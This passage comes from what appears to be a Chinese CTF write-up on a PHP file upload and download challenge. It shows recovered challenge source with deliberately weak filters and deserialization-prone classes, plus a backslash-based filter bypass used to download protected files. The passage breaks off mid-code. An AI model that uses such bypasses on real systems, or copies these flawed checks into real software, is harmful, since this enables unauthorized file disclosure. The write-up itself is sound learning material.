src="http://pic.c1imber.top/blog/20191019/Q2oFRSeddAD1.png?imageslim" alt="mark"><br><strong>修改为绝对路径<code>/file.php?file=/var/www/html/download.php</code>,读取成功</strong><br><img src="http://pic.c1imber.top/blog/20191019/4wezOnEoEe8a.png?imageslim" alt="mark"><br><strong>完整源码如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&lt;html&gt;</div><div class="line">&lt;pre&gt;    </div><div class="line"></div><div class="line">$name = $_GET[<span class="string">'name'</span>];</div><div class="line">$url = $_SERVER[<span class="string">'QUERY_STRING'</span>];</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($name))&#123;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/\.|etc|var|tmp|usr/i'</span>, $url))&#123;</div><div class="line">        <span class="keyword">echo</span>(<span class="string">"hacker!"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/base|class|file|function|index|upload_file/i'</span>, $name))&#123;</div><div class="line">            <span class="keyword">echo</span> (<span class="string">"hacker!"</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">            $name = safe_replace($name);</div><div class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/base|class|file|function|index|upload_file/i'</span>, $name))&#123;</div><div class="line">                $filename = $name.<span class="string">'.php'</span>;</div><div class="line">                $dir =<span class="string">"./"</span>;</div><div class="line">                $down_host = $_SERVER[<span class="string">'HTTP_HOST'</span>].<span class="string">'/'</span>;</div><div class="line">                <span class="keyword">if</span>(file_exists(<span class="keyword">__DIR__</span>.<span class="string">'/'</span>.$dir.$filename))&#123;</div><div class="line">                    $file = fopen ( $dir.$filename, <span class="string">"rb"</span> );</div><div class="line">                    Header ( <span class="string">"Content-type: application/octet-stream"</span> );</div><div class="line">                    Header ( <span class="string">"Accept-Ranges: bytes"</span> );</div><div class="line">                    Header ( <span class="string">"Accept-Length: "</span> . filesize ( $dir.$filename ) );</div><div class="line">                    Header ( <span class="string">"Content-Disposition: attachment; filename="</span> . $filename );</div><div class="line">                    <span class="keyword">echo</span> fread ( $file, filesize ( $dir . $filename ) );</div><div class="line">                    fclose ( $file );</div><div class="line">                    <span class="keyword">exit</span> ();</div><div class="line">                &#125;<span class="keyword">else</span>&#123;</div><div class="line">                    <span class="keyword">echo</span> (<span class="string">"file doesn't exist."</span>);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/flag/i'</span>, $name))&#123;</div><div class="line">                <span class="keyword">echo</span> (<span class="string">"hacker!"</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">&lt;/pre&gt;</div><div class="line">&lt;/html&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$name = $_GET[<span class="string">'name'</span>];</div><div class="line">$url = $_SERVER[<span class="string">'QUERY_STRING'</span>];</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($name))&#123;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/\.|etc|var|tmp|usr/i'</span>, $url))&#123;</div><div class="line">        <span class="keyword">echo</span>(<span class="string">"hacker!"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/base|class|file|function|index|upload_file/i'</span>, $name))&#123;</div><div class="line">            <span class="keyword">echo</span> (<span class="string">"hacker!"</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">            $name = safe_replace($name);</div><div class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/base|class|file|function|index|upload_file/i'</span>, $name))&#123;</div><div class="line">                $filename = $name.<span class="string">'.php'</span>; <span class="comment">//获取文件名称</span></div><div class="line">                $dir =<span class="string">"./"</span>;  <span class="comment">//相对于网站根目录的下载目录路径</span></div><div class="line">                $down_host = $_SERVER[<span class="string">'HTTP_HOST'</span>].<span class="string">'/'</span>; <span class="comment">//当前域名</span></div><div class="line">                <span class="comment">//判断如果文件存在,则跳转到下载路径</span></div><div class="line">                <span class="keyword">if</span>(file_exists(<span class="keyword">__DIR__</span>.<span class="string">'/'</span>.$dir.$filename))&#123;</div><div class="line">                    $file = fopen ( $dir.$filename, <span class="string">"rb"</span> );    </div><div class="line"></div><div class="line">                    <span class="comment">//告诉浏览器这是一个文件流格式的文件</span></div><div class="line">                    Header ( <span class="string">"Content-type: application/octet-stream"</span> );</div><div class="line">                    <span class="comment">//请求范围的度量单位</span></div><div class="line">                    Header ( <span class="string">"Accept-Ranges: bytes"</span> );</div><div class="line">                    <span class="comment">//Content-Length是指定包含于请求或响应中数据的字节长度</span></div><div class="line">                    Header ( <span class="string">"Accept-Length: "</span> . filesize ( $dir.$filename ) );</div><div class="line">                    <span class="comment">//用来告诉浏览器，文件是可以当做附件被下载，下载后的文件名称为$file_name该变量的值。</span></div><div class="line">                    Header ( <span class="string">"Content-Disposition: attachment; filename="</span> . $filename );    </div><div class="line"></div><div class="line">                    <span class="comment">//读取文件内容并直接输出到浏览器</span></div><div class="line">                    <span class="keyword">echo</span> fread ( $file, filesize ( $dir . $filename ) );</div><div class="line">                    fclose ( $file );</div><div class="line">                    <span class="keyword">exit</span> ();</div><div class="line">                &#125;<span class="keyword">else</span>&#123;</div><div class="line">                    <span class="keyword">echo</span> (<span class="string">"file doesn't exist."</span>);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/flag/i'</span>, $name))&#123;</div><div class="line">                <span class="keyword">echo</span> (<span class="string">"hacker!"</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;    </div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">//return safe name</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_replace</span><span class="params">($string)</span> </span>&#123;</div><div class="line">    $string = str_replace(<span class="string">'%20'</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'%27'</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'%2527'</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'*'</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">"'"</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">';'</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'&lt;'</span>,<span class="string">'&amp;lt;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">"&#123;"</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'&#125;'</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'\\'</span>,<span class="string">''</span>,$string);</div><div class="line">    <span class="keyword">return</span> $string;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>其中可以利用<code>$string = str_replace(&#39;\\&#39;,&#39;&#39;,$string);</code>进行文件下载绕过，绕过方法如下：</strong></p><p><strong><code>/download.php?name=ind\\ex</code></strong><br><img src="http://pic.c1imber.top/blog/20191019/X6zYCWVL0ipY.png?imageslim" alt="mark"></p><p><strong>通过文件读取和文件下载结合获取源代码：</strong></p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);  </div><div class="line"><span class="keyword">include</span> <span class="string">'base.php'</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>base.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">    session_start(); </div><div class="line"><span class="meta">?&gt;</span> </div><div class="line">&lt;!DOCTYPE html&gt; </div><div class="line">&lt;html&gt; </div><div class="line">&lt;head&gt; </div><div class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt; </div><div class="line">    &lt;title&gt;upload_or_not&lt;/title&gt; </div><div class="line">    &lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css"</span>&gt; </div><div class="line">    &lt;script src=<span class="string">"https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js"</span>&gt;&lt;/script&gt; </div><div class="line">    &lt;script src=<span class="string">"https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js"</span>&gt;&lt;/script&gt; </div><div class="line">&lt;/head&gt; </div><div class="line">&lt;body&gt; </div><div class="line">    &lt;nav class="navbar navbar-default" role="navigation"&gt; </div><div class="line">        &lt;div class="container-fluid"&gt; </div><div class="line">        &lt;div class="navbar-header"&gt; </div><div class="line">            &lt;a class="navbar-brand" href="index.php"&gt;首页&lt;/a&gt; </div><div class="line">        &lt;/div&gt; </div><div class="line">            &lt;ul class="nav navbar-nav navbra-toggle"&gt; </div><div class="line">                &lt;li class="active"&gt;&lt;a href="file.php?file="&gt;查看文件&lt;/a&gt;&lt;/li&gt; </div><div class="line">                &lt;li&gt;&lt;a href=<span class="string">"upload_file.php"</span>&gt;上传文件&lt;/a&gt;&lt;/li&gt;</div><div class="line">                &lt;li&gt;&lt;a href=<span class="string">"download.php"</span>&gt;下载文件&lt;/a&gt;&lt;/li&gt;</div><div class="line">            &lt;/ul&gt; </div><div class="line">            &lt;ul class="nav navbar-nav navbar-right"&gt; </div><div class="line">                &lt;li&gt;&lt;a href="index.php"&gt;&lt;span class="glyphicon glyphicon-user"&gt;&lt;/span&gt;&lt;?php echo $_SERVER['REMOTE_ADDR'];?&gt;&lt;/a&gt;&lt;/li&gt; </div><div class="line">            &lt;/ul&gt; </div><div class="line">        &lt;/div&gt; </div><div class="line">    &lt;/nav&gt; </div><div class="line">&lt;/body&gt; </div><div class="line">&lt;/html&gt; </div><div class="line">&lt;!--flag is in /flag--&gt;</div></pre></td></tr></table></figure><p><strong>file.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);  </div><div class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>; </div><div class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>;</div><div class="line">$file = $_GET[<span class="string">"file"</span>] ? $_GET[<span class="string">'file'</span>] : <span class="string">""</span>; </div><div class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($file)) &#123; </div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;There is no file to show!&lt;h2/&gt;"</span>; </div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\/|\.\.|flag/i'</span>,$file)) &#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">'hacker!'</span>); </div><div class="line">&#125;<span class="keyword">elseif</span>(!preg_match(<span class="string">'/\//i'</span>,$file))</div><div class="line">&#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</div><div class="line">&#125;</div><div class="line">$show = <span class="keyword">new</span> Show(); </div><div class="line"><span class="keyword">if</span>(file_exists($file)) &#123; </div><div class="line">    $show-&gt;source = $file; </div><div class="line">    $show-&gt;_show(); </div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>($file))&#123; </div><div class="line">    <span class="keyword">die</span>(<span class="string">'file doesn\'t exists.'</span>); </div><div class="line">&#125; </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>function.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//show_source(__FILE__); </span></div><div class="line"><span class="keyword">include</span> <span class="string">"base.php"</span>; </div><div class="line">header(<span class="string">"Content-type: text/html;charset=utf-8"</span>); </div><div class="line">error_reporting(<span class="number">0</span>); </div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span><span class="params">()</span> </span>&#123; </div><div class="line">    <span class="keyword">global</span> $_FILES; </div><div class="line">    $filename = md5($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]).<span class="string">".jpg"</span>; </div><div class="line">    <span class="comment">//mkdir("upload",0777); </span></div><div class="line">    <span class="keyword">if</span>(file_exists(<span class="string">"upload/"</span> . $filename)) &#123; </div><div class="line">        unlink($filename); </div><div class="line">    &#125; </div><div class="line">    move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],<span class="string">"upload/"</span> . $filename); </div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;script type="text/javascript"&gt;alert("上传成功!");&lt;/script&gt;'</span>; </div><div class="line">&#125; </div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span><span class="params">()</span> </span>&#123; </div><div class="line">    <span class="keyword">global</span> $_FILES; </div><div class="line">    <span class="keyword">if</span>(upload_file_check()) &#123; </div><div class="line">        upload_file_do(); </div><div class="line">    &#125; </div><div class="line">&#125; </div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span><span class="params">()</span> </span>&#123; </div><div class="line">    <span class="keyword">global</span> $_FILES; </div><div class="line">    $allowed_types = <span class="keyword">array</span>(<span class="string">"gif"</span>,<span class="string">"jpeg"</span>,<span class="string">"jpg"</span>,<span class="string">"png"</span>); </div><div class="line">    $temp = explode(<span class="string">"."</span>,$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]); </div><div class="line">    $extension = end($temp); </div><div class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($extension)) &#123; </div><div class="line">        <span class="comment">//echo "&lt;h4&gt;请选择上传的文件:" . "&lt;h4/&gt;"; </span></div><div class="line">    &#125; </div><div class="line">    <span class="keyword">else</span>&#123; </div><div class="line">        <span class="keyword">if</span>(in_array($extension,$allowed_types)) &#123; </div><div class="line">            <span class="keyword">return</span> <span class="keyword">true</span>; </div><div class="line">        &#125; </div><div class="line">        <span class="keyword">else</span> &#123; </div><div class="line">            <span class="keyword">echo</span> <span class="string">'&lt;script type="text/javascript"&gt;alert("Invalid file!");&lt;/script&gt;'</span>; </div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>; </div><div class="line">        &#125; </div><div class="line">    &#125; </div><div class="line">&#125; </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>upload_file.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>; </div><div class="line">upload_file(); </div><div class="line"><span class="meta">?&gt;</span> </div><div class="line">&lt;html&gt; </div><div class="line">&lt;head&gt; </div><div class="line">&lt;meta charest=<span class="string">"utf-8"</span>&gt; </div><div class="line">&lt;title&gt;文件上传&lt;/title&gt; </div><div class="line">&lt;/head&gt; </div><div class="line">&lt;body&gt; </div><div class="line">&lt;div align = <span class="string">"center"</span>&gt; </div><div class="line">        &lt;h1&gt;上传的文件保存在/upload/md5($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]).<span class="string">".jpg"</span>&lt;/h1&gt; </div><div class="line">&lt;/div&gt; </div><div class="line">&lt;style&gt; </div><div class="line">    p&#123; margin:<span class="number">0</span> auto&#125; </div><div class="line">&lt;/style&gt; </div><div class="line">&lt;div&gt; </div><div class="line">&lt;form action=<span class="string">"upload_file.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt; </div><div class="line">    &lt;label <span class="keyword">for</span>=<span class="string">"file"</span>&gt;文件名:&lt;/label&gt; </div><div class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> id=<span class="string">"file"</span>&gt;&lt;br&gt; </div><div class="line">    &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"提交"</span>&gt; </div><div class="line">&lt;/div&gt;     </div><div class="line"></div><div class="line"></div><div class="line">&lt;/body&gt; </div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure><p><strong>class.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&lt;html&gt;</div><div class="line">&lt;pre&gt;    </div><div class="line"></div><div class="line">$name = $_GET[<span class="string">'name'</span>];</div><div class="line">$url = $_SERVER[<span class="string">'QUERY_STRING'</span>];</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($name))&#123;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/\.|etc|var|tmp|usr/i'</span>, $url))&#123;</div><div class="line">        <span class="keyword">echo</span>(<span class="string">"hacker!"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/base|class|file|function|index|upload_file/i'</span>, $name))&#123;</div><div class="line">            <span class="keyword">echo</span> (<span class="string">"hacker!"</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">            $name = safe_replace($name);</div><div class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/base|class|file|function|index|upload_file/i'</span>, $name))&#123;</div><div class="line">                $filename = $name.<span class="string">'.php'</span>;</div><div class="line">                $dir =<span class="string">"./"</span>;</div><div class="line">                $down_host = $_SERVER[<span class="string">'HTTP_HOST'</span>].<span class="string">'/'</span>;</div><div class="line">                <span class="keyword">if</span>(file_exists(<span class="keyword">__DIR__</span>.<span class="string">'/'</span>.$dir.$filename))&#123;</div><div class="line">                    $file = fopen ( $dir.$filename, <span class="string">"rb"</span> );</div><div class="line">                    Header ( <span class="string">"Content-type: application/octet-stream"</span> );</div><div class="line">                    Header ( <span class="string">"Accept-Ranges: bytes"</span> );</div><div class="line">                    Header ( <span class="string">"Accept-Length: "</span> . filesize ( $dir.$filename ) );</div><div class="line">                    Header ( <span class="string">"Content-Disposition: attachment; filename="</span> . $filename );</div><div class="line">                    <span class="keyword">echo</span> fread ( $file, filesize ( $dir . $filename ) );</div><div class="line">                    fclose ( $file );</div><div class="line">                    <span class="keyword">exit</span> ();</div><div class="line">                &#125;<span class="keyword">else</span>&#123;</div><div class="line">                    <span class="keyword">echo</span> (<span class="string">"file doesn't exist."</span>);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/flag/i'</span>, $name))&#123;</div><div class="line">                <span class="keyword">echo</span> (<span class="string">"hacker!"</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">&lt;/pre&gt;</div><div class="line">&lt;/html&gt;</div><div class="line"><span class="meta">&lt;?php</span>    </div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $source;</div><div class="line">    <span class="keyword">public</span> $str;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        $text= <span class="keyword">$this</span>-&gt;source;</div><div class="line">        $text = base64_encode(file_get_contents($text));</div><div class="line">        <span class="keyword">return</span> $text;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        $text= <span class="keyword">$this</span>-&gt;source;</div><div class="line">        $text = base64_encode(file_get_contents($text));</div><div class="line">        <span class="keyword">return</span> $text;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($key,$value)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\.|flag/i'</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"hacker~"</span>;</div><div class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">S6ow</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $file;</div><div class="line">    <span class="keyword">public</span> $params;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;params[$key];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)</div><div class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></div><div class="line"><span class="function">    